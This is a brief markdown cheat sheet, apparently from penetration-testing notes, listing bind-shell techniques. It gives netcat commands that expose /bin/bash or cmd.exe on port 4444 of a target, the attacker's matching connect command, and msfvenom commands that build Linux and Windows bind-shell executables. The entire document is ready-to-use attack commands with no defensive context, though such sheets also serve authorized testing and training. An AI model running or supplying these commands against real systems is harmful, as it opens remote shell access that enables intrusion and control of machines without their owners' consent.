# Bind Shells

## Netcat Bind
```bash
# Target
nc -lvnp 4444 -e /bin/bash
nc -lvnp 4444 -e cmd.exe

# Attacker
nc $TARGET_IP 4444
```

## MSFVenom Bind
```bash
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind.exe
```
